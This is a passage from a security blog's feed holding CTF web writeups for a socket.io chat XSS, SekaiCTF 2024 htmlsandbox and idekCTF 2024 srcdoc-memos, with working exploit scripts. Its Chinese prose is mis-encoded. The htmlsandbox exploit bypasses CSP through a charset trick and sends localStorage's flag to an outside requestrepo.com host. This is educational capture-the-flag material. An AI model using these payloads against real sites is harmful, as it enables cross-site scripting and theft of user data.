punctuation">:</span>        <span class="token keyword">return</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'FizzBuzz101 joined.'</span><span class="token punctuation">:</span> <span class="token comment"># XSS bot opened the chat</span>        first_sid <span class="token operator">=</span> create_sid<span class="token punctuation">(</span><span class="token punctuation">)</span>        js_payload <span class="token operator">=</span> <span class="token triple-quoted-string string">"""(window.exfil = data => window.top.opener.top.socket.emit('message', data))(window.observer = new parent.PerformanceObserver((list) => &#123; list.getEntries().forEach((entry) => &#123; window.exfil('Flag: ' + decodeURIComponent(entry.name.split('/').pop())); &#125;); &#125;))(window.observer.observe(&#123; type: 'resource', buffered: true &#125;))"""</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">)</span>        sio<span class="token punctuation">.</span>emit<span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token string">'\\"+'</span><span class="token operator">+</span>js_payload<span class="token operator">+</span><span class="token string">');//'</span><span class="token punctuation">)</span>        second_sid <span class="token operator">=</span> create_sid<span class="token punctuation">(</span><span class="token punctuation">)</span>        jsonp_url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base_url<span class="token punctuation">&#125;</span></span><span class="token string">/socket.io/?EIO=4&amp;transport=polling&amp;t=bingus&amp;sid=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>second_sid<span class="token punctuation">&#125;</span></span><span class="token string">&amp;j=0'</span></span>        js_payload <span class="token operator">=</span> <span class="token triple-quoted-string string">"""(window.secret=window.open('','secret'))(window.a=window.top.document.getElementById('xss').cloneNode())(window.a.srcdoc=window.a.srcdoc.replace('%s','%s'))(window.secret.document.body.appendChild(window.a))"""</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token punctuation">(</span>second_sid<span class="token punctuation">,</span> first_sid<span class="token punctuation">)</span>        sio<span class="token punctuation">.</span>emit<span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token string">'\\"+'</span><span class="token operator">+</span>js_payload<span class="token operator">+</span><span class="token string">');//'</span><span class="token punctuation">)</span>        xss_payload <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;a id=&amp;quot;___eio&amp;quot;>&lt;/a>&lt;a id=&amp;quot;___eio&amp;quot;>&lt;/a>&lt;script src=&amp;quot;%s&amp;quot;>&lt;/script>"""</span> <span class="token operator">%</span> jsonp_url        chat_message <span class="token operator">=</span> <span class="token string">'&lt;iframe id="xss" srcdoc="%s">&lt;/iframe>'</span> <span class="token operator">%</span> xss_payload<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>chat_message<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">400</span><span class="token punctuation">,</span> <span class="token string">'chat message too long, time to write better payload'</span>        sio<span class="token punctuation">.</span>emit<span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> chat_message<span class="token punctuation">)</span>sio<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>base_url<span class="token punctuation">)</span>sio<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3><span id="webx2frepayment-pal-0-solve">web&#x2F;repayment-pal - 0 solve</span></h3><p>Author: strellic</p><p>è·Ÿ Next.js æœ‰é—œçš„é¡Œç›®ï¼Œè³½ä¸­æ²’æœ‰äººè§£é–‹ï¼Œè³½å¾Œä¹Ÿæ²’æœ‰å…¬ä½ˆè§£æ³•ã€‚</p><p>åº•ä¸‹æ˜¯å…¬ä½ˆéçš„æç¤ºï¼š</p><ol><li>+24 hour hint drop: hm, why is dev mode enabled?</li><li>+36 hour hint drop: try to find a way to get html injection!</li><li>Post-CTF hint drop: An earlier version of the challenge had an extra check in the middleware, requiring all API requests to have the header Sec-Fetch-Dest: empty</li></ol><h2><span id="sekaictf-2024">sekaiCTF 2024</span></h2><h3><span id="htmlsandbox-4-solves">htmlsandbox (4 solves)</span></h3><p>Author: arxenix</p><p>é¡Œç›®é€£çµï¼š<a href="https://github.com/project-sekai-ctf/sekaictf-2024/tree/main/web/htmlsandbox">https://github.com/project-sekai-ctf/sekaictf-2024/tree/main/web/htmlsandbox</a></p><p>é€™é¡Œå¯ä»¥è®“ä½ ä¸Šå‚³ HTMLï¼Œä½†æ˜¯æŠŠèƒ½æ“‹çš„å…¨éƒ¨éƒ½æ“‹æ‰äº†ï¼Œä¸¦ä¸”æœƒæª¢æŸ¥ head è£¡é¢æœ‰æ²’æœ‰ï¼š<code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#39;none&#39;&quot;&gt;</code>ï¼Œä¾†ç¢ºä¿ä¸èƒ½åŸ·è¡Œ JavaScript ç¨‹å¼ç¢¼ã€‚</p><p>è€Œè§£æ³•æ˜¯æª¢æŸ¥çš„æ™‚å€™æ˜¯æŠŠ HTML è®Šæˆ <code>data:text/html</code> ä¾†æª¢æŸ¥ï¼Œä½†å¯¦éš›é€ è¨ªçš„æ™‚å€™å°±æ˜¯ä¸€èˆ¬çš„ç¶²é ï¼Œè€Œé€™å…©è€…çš„ parsing è¦å‰‡ä¸ä¸€æ¨£ï¼Œç•¶æª”æ¡ˆå¾ˆå¤§çš„æ™‚å€™ï¼Œå‰è€…æœƒå…¨éƒ¨ä¸€æ¬¡ parsingï¼Œä½†å¾Œè€…æœƒä¸€å€‹ chunk ä¸€å€‹ chunk åšï¼Œè€Œä¸”æ¯å€‹ chunk çš„ encoding å¯ä»¥ä¸åŒã€‚</p><p>ç´°ç¯€å¯ä»¥çœ‹ä½œè€…çš„ writeupï¼š<a href="https://blog.ankursundara.com/htmlsandbox-writeup/">SekaiCTFâ€™24 htmlsandbox - Author Writeup</a> æˆ–æ˜¯é€™ç¯‡ <a href="https://0xalessandro.github.io/posts/sekai/">0xalessandro çš„ writeup</a>ï¼Œä»–æœ€å¾Œçš„ exploit é•·é€™æ¨£ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token comment">#0xAlessandro was here</span>c1 <span class="token operator">=</span> <span class="token triple-quoted-string string">b'''&lt;html>&lt;head>    &lt;!-- \x1b$@ aa -->'''</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">b'''&lt;meta http-equiv="Content-Security-Policy" content="default-src 'none'">\x1b(B &lt;!-- test -->'''</span> <span class="token operator">+</span> <span class="token string">b"\x1b(B&lt;!-- "</span> <span class="token operator">+</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">64000</span> <span class="token operator">+</span> <span class="token string">b"-->"</span><span class="token operator">+</span> <span class="token string">b"&lt;!--"</span><span class="token operator">+</span><span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">100</span><span class="token operator">+</span><span class="token string">b"-->"</span>c2 <span class="token operator">=</span> <span class="token triple-quoted-string string">b'''    &lt;meta charset="utf-8">    &lt;/head>    &lt;body>    &lt;svg>&lt;animate onbegin="fetch(`https://s9cs3dwb.requestrepo.com?c=$&#123;localStorage.getItem('flag')&#125;`)" attributeName="x" dur="1s">    &lt;/body>&lt;/html>'''</span>html <span class="token operator">=</span> c1 <span class="token operator">+</span> c2<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'test.html'</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>   f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>html<span class="token punctuation">)</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'https://htmlsandbox.chals.sekai.team/upload'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'html'</span><span class="token punctuation">:</span> html<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ä½¿ç”¨ data URI çš„æ™‚å€™ï¼Œæ•´å€‹ HTML å°±æ˜¯è¢«ç•¶ä½œ utf-8 ä¾†è§£æï¼Œæ²’ä»€éº¼å•é¡Œã€‚</p><p>ä½†è¢«ç•¶ä½œç¶²é ä¾†é€ è¨ªçš„æ™‚å€™ï¼Œç”±æ–¼åˆ†æˆäº†å…©å€‹ chunkï¼Œè€Œ <code>&lt;meta charset=&quot;utf-8&quot;&gt;</code> å‡ºç¾åœ¨ç¬¬äºŒå€‹ chunkï¼Œå› æ­¤ç¬¬ä¸€å€‹ chunk æœƒç”¨ <code>JIS X 0208 1983</code> ä¾†è§£æï¼ŒCSP å°±è®Šæˆäº†ä¸€å †äº‚ç¢¼ï¼Œè¢«æ‹¿æ‰äº†ã€‚</p><p>è®€åˆ°ç¬¬äºŒå€‹ chunk æ™‚çœ‹åˆ° metaï¼Œå°±åˆ‡æ›æˆ UTF-8ï¼Œç…§å¸¸è¼‰å…¥ï¼Œå¦‚æ­¤ä¸€ä¾†å°±å¯ä»¥æ“ºè„« CSPï¼Œé”æˆ XSSã€‚</p><p>é€™å€‹ encoding åˆ©ç”¨çš„ç´°ç¯€å¯ä»¥åƒè€ƒï¼š<a href="https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/">Encoding Differentials: Why Charset Matters</a>ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä¹…é•çš„ç­†è¨˜ï¼Œæƒ³å¯«å¾ˆä¹…äº†ä½†ä¸€ç›´æ‹–å»¶ï¼Œåƒæ˜¯ CTF é€™ç¨®æ±è¥¿çš„ writeup å…¶å¯¦é€Ÿåº¦æ»¿é‡è¦çš„ï¼Œå› ç‚ºè³½å¾Œè¨è«–å¤§éƒ¨åˆ†éƒ½åœ¨ Discord è£¡é¢ç™¼ç”Ÿï¼Œæ™‚é–“ä¹…äº†è¨Šæ¯æ¯”è¼ƒé›£æ‰¾ï¼Œè€Œä¸”å¾ˆæœ‰å¯èƒ½å¿˜è¨˜ï¼Œè¦è¶•å¿«å¯«æˆ writeup æ‰èƒ½æŠŠé‚£äº›å¯¦ç”¨çš„è³‡è¨Šè¨˜éŒ„ä¸‹ä¾†ã€‚&lt;/p&gt;
&lt;p&gt;é€™ç¯‡ä¸€æ¬¡å¸¶ä¾†ä¸‰å€‹ CTF çš„ writeupï¼Œæœ‰äº›æˆ‘æ²’æœ‰æ‰“ï¼Œåªæ˜¯ç´”ç²¹çœ‹è‘—åˆ¥äººçš„ç­†è¨˜é‡æ–°è¨˜ä¸€éè€Œå·²ã€‚&lt;/p&gt;
&lt;p&gt;é—œéµå­—åˆ—è¡¨ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;bfcache&lt;/li&gt;
&lt;li&gt;response splitting&lt;/li&gt;
&lt;li&gt;Service-Worker-Allowed&lt;/li&gt;
&lt;li&gt;gunicorn script_name&lt;/li&gt;
&lt;li&gt;socket.io disconnect&lt;/li&gt;
&lt;li&gt;socket.io JSONP CSP bypass&lt;/li&gt;
&lt;li&gt;performance API&lt;/li&gt;
&lt;li&gt;streaming HTML parsing &lt;/li&gt;
&lt;li&gt;content-type ISO-2022-JP&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>idekCTF 2024 ç­†è¨˜ä¹‹ iframe é«˜ç´šé­”æ³•</title>
    <link href="https://blog.huli.tw/2024/09/07/idek-ctf-2024-iframe/"/>
    <id>https://blog.huli.tw/2024/09/07/idek-ctf-2024-iframe/</id>
    <published>2024-09-07T02:40:00.000Z</published>
    <updated>2024-09-11T22:45:42.249Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨ idekCTF 2024 ä¸­ï¼Œç”± icesfont æ‰€å‡ºçš„ä¸€é“é¡Œç›® srcdoc-memos ååˆ†æœ‰è¶£ï¼Œç‰½æ¶‰åˆ°äº†è¨±å¤š iframe çš„ç›¸é—œçŸ¥è­˜ã€‚æˆ‘æ²’æœ‰å¯¦éš›åƒåŠ æ¯”è³½ï¼Œä½†è³½å¾Œçœ‹äº†é¡Œç›®ä»¥åŠè§£æ³•ï¼Œé‚„æ˜¯èŠ±äº†å¥½å¹¾å¤©æ‰çµ‚æ–¼çœ‹æ‡‚ç‚ºä»€éº¼ï¼Œååˆ†å€¼å¾—æŠŠéç¨‹ä»¥åŠè§£æ³•è¨˜éŒ„ä¸‹ä¾†ã€‚</p><p>ç”±æ–¼é€™é¡Œç‰½æ¶‰åˆ°ä¸å°‘èˆ‡ iframe ç›¸é—œçš„çŸ¥è­˜ï¼Œæˆ‘æœƒç›¡é‡ä¸€æ­¥ä¸€æ­¥ä¾†ï¼Œæœƒæ¯”è¼ƒå¥½ç†è§£ã€‚</p><span id="more"></span><h2><span id="srcdoc-memos">srcdoc-memos</span></h2><p>é¡Œç›®é€£çµï¼š<a href="https://github.com/idekctf/idekctf-2024/tree/main/web/srcdoc-memos">https://github.com/idekctf/idekctf-2024/tree/main/web/srcdoc-memos</a></p><p>é€™é¡Œçš„ç¨‹å¼ç¢¼å¦‚ä¸‹ï¼Œç›®æ¨™æ˜¯é”æˆ XSS å·åˆ°é å…ˆè¨­ç½®å¥½çš„ flagï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">escape</span> <span class="token operator">=</span> <span class="token parameter">html</span> <span class="token operator">=></span> html  <span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">"&amp;quot;"</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token string">"&amp;lt;"</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"&amp;gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">handler</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>url<span class="token punctuation">,</span> <span class="token string">"http://localhost"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">let</span> memo<span class="token punctuation">;</span>  <span class="token keyword">switch</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span>pathname<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">case</span> <span class="token string">"/"</span><span class="token operator">:</span>    memo <span class="token operator">=</span>      cookie<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>cookie <span class="token operator">||</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>memo <span class="token operator">??</span>      <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;h2>Welcome to srcdoc memos!&lt;/h2>\n&lt;p>HTML is supported&lt;/p></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"text/html; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;script>document.head.insertAdjacentHTML(  "beforeend",  \`&lt;meta http-equiv="Content-Security-Policy" content="script-src 'none';">\`);if (window.opener !== null) &#123;  console.error("has opener");  document.documentElement.remove();&#125;&lt;/script>&lt;h1>srcdoc memos&lt;/h1>&lt;div class="horizontal">  &lt;iframe srcdoc="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">escape</span><span class="token punctuation">(</span>memo<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">">&lt;/iframe>  &lt;textarea name="memo" placeholder="&lt;b>TODO&lt;/b>: ..." form="update"></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">escape</span><span class="token punctuation">(</span>memo<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/textarea>&lt;/div>&lt;form id="update" action="/memo">  &lt;input type="submit" value="update memo">&lt;/form>    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token keyword">case</span> <span class="token string">"/memo"</span><span class="token operator">:</span>    memo <span class="token operator">=</span> url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"memo"</span><span class="token punctuation">)</span> <span class="token operator">??</span> <span class="token string">""</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span>statusCode <span class="token operator">=</span> <span class="token number">302</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Set-Cookie"</span><span class="token punctuation">,</span> cookie<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token string">"memo"</span><span class="token punctuation">,</span> memo<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Location"</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token keyword">default</span><span class="token operator">:</span>    res<span class="token punctuation">.</span>statusCode <span class="token operator">=</span> <span class="token number">404</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"text/plain; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"not found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…¶å¯¦é¡Œç›®æœ¬èº«çš„åŠŸèƒ½æ»¿ç°¡å–®ï¼Œå°±æ˜¯æœ‰ä¸€å€‹ <code>/memo?memo=xxx</code> çš„ API å¯ä»¥è¨­ç½® cookieï¼Œæ¥è‘—åœ¨è¨ªå• index çš„æ™‚å€™ï¼ŒæœƒæŠŠå…§å®¹æ”¾åˆ° <code>srcdoc</code> å»ï¼Œä½†æœ€é‡è¦çš„æ˜¯åŒå€‹é é¢ä¸Šæœ‰ä¸€æ®µ scriptï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">insertAdjacentHTML</span><span class="token punctuation">(</span>  <span class="token string">"beforeend"</span><span class="token punctuation">,</span>  \`<span class="token operator">&lt;</span>meta http<span class="token operator">-</span>equiv<span class="token operator">=</span><span class="token string">"Content-Security-Policy"</span> content<span class="token operator">=</span><span class="token string">"script-src 'none';"</span><span class="token operator">></span>\`<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>opener <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"has opener"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸»è¦æœƒåšå…©ä»¶äº‹æƒ…ï¼š</p><ol><li>åŠ ä¸Š script-src none çš„ CSP</li><li>å¦‚æœæœ‰ openerï¼Œå°±æŠŠå…§å®¹ç§»é™¤æ‰</li></ol><h2><span id="å›°é›£é»">å›°é›£é»</span></h2><p>å…ˆåˆ¥ç®¡ opener é‚£å€‹ï¼Œé‚£å€‹æ¯”è¼ƒå¥½è§£æ±ºï¼Œé›£çš„æ˜¯ CSPã€‚</p><p>çœ‹å®Œé¡Œç›®ä¹‹å¾Œæˆ‘çš„æ€è€ƒéç¨‹æ˜¯é€™æ¨£çš„ï¼Œç”±æ–¼ <code>&lt;iframe srcdoc&gt;</code> çš„ CSP æœƒç¹¼æ‰¿å®ƒçš„ parentï¼Œå› æ­¤ä¸Šå±¤æœ‰çš„è©±ï¼Œä¸‹å±¤ä¸€å®šæœ‰ï¼Œæ‰€ä»¥è¦æƒ³è¾¦æ³•æŠŠé‚£å€‹ CSP å¼„æ‰ï¼Œé‚£æ—¢ç„¶è¦å¼„æ‰ï¼Œæˆ‘å”¯ä¸€èƒ½æƒ³åˆ°çš„å°±æ˜¯é€é <code>&lt;iframe csp&gt;</code> å±¬æ€§å…ˆåŠ ä¸Š CSPï¼Œå°±èƒ½é˜»æ­¢é‚£æ®µ script çš„è¼‰å…¥ã€‚</p><p>ä½†ç”±æ–¼é€™ä¸€é¡Œçš„å…§å®¹æ˜¯é€é cookie å¸¶å…¥ï¼Œæ‰€ä»¥æœƒæœ‰ same-site cookie çš„é™åˆ¶ï¼Œåœ¨æˆ‘å€‘çš„ origin æ˜¯æ²’è¾¦æ³•æ’å…¥ iframe çš„ï¼Œcookie æœƒæœ‰å•é¡Œï¼Œå› æ­¤ä¸€å®šè¦åœ¨é¡Œç›®çš„ origin ä½¿ç”¨ <code>&lt;iframe csp&gt;</code>ï¼Œé™¤äº†é€™å€‹ä»¥å¤–ï¼Œæˆ‘æƒ³ä¸åˆ°ä»»ä½•æ–¹å¼å¯ä»¥æŠŠ CSP æ‹¿æ‰ã€‚</p><h2><span id="è§£æ³•">è§£æ³•</span></h2><p>ä¹‹æ‰€ä»¥æœƒèªª opener æ¯”è¼ƒå¥½è§£æ±ºï¼Œæ˜¯å› ç‚ºä¹‹å‰å°±æœ‰çœ‹éé¡ä¼¼çš„é¡Œç›®ã€‚</p><p>è¦å¦‚ä½•è®“ opener æ˜¯ null æœ‰å¹¾å€‹æ–¹æ³•ï¼Œç¬¬ä¸€å€‹é¡ä¼¼æ–¼ <a href="https://blog.huli.tw/2022/10/08/sekaictf2022-safelist-and-connection/#obligatory-calc">SekaiCTF 2022 - Obligatory Calc</a> ä¸­æ‰€å‡ºç¾éçš„ï¼ŒåŸ·è¡Œ <code>window.open</code> ä¹‹å¾Œå°±å¿«é€Ÿé—œé–‰è‡ªå·±ï¼Œ<code>opener</code> å°±æœƒæ˜¯ nullï¼Œé€™é¡Œçš„ä½œè€… icesfont ç”¨çš„å°±æ˜¯é€™å€‹æ–¹æ³•ï¼ˆå¦‚æœæ˜¯åœ¨ console ä¸Šæ¸¬è©¦ï¼Œæœƒç™¼ç¾åŸ·è¡Œä»¥å¾Œä»€éº¼éƒ½ä¸æœƒç™¼ç”Ÿï¼Œå› ç‚ºç€è¦½å™¨é è¨­ä¸èƒ½åœ¨æ²’æœ‰å‹•ä½œä¸‹å°±é–‹å•Ÿæ–°çš„ windowï¼Œæ‰€ä»¥ç¬¬äºŒå€‹ open æœƒè¢«æ“‹ä½ï¼‰ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">openNoOpener</span><span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">open</span><span class="token punctuation">(</span><span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">    &lt;script>      open("</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">", "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">");      window.close();    &lt;\/script>  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"text/html"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¬¬äºŒå€‹æ–¹æ³•æˆ‘æ˜¯åœ¨ Discord è£¡é¢çœ‹åˆ° Jazzy æçš„ï¼Œå…¶å¯¦åªè¦ open ä¹‹å¾Œè‡ªå·±æŠŠ opener è¨­æˆ null å°±å¥½ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">openNoOpener</span><span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> w <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> name<span class="token punctuation">)</span>  w<span class="token punctuation">.</span>opener <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ä¹‹æ‰€ä»¥å¯ä»¥é€™æ¨£ï¼Œæ˜¯å› ç‚ºå‰›é–‹å•Ÿä¹‹å¾Œæœƒæœ‰ä¸€å°æ®µæ™‚é–“ï¼Œé–‹å•Ÿçš„ window è·Ÿç•¶å‰ window æ˜¯ same-originï¼Œæ‰€ä»¥é€™ä¸€æ®µæ™‚é–“æ˜¯å¯ä»¥æ“ä½œå®ƒçš„ï¼Œæ¥è‘—æ‰æœƒè¢«å°åˆ°è¦å‰å¾€çš„ URLã€‚</p><p>é›–ç„¶å¤±å»äº† 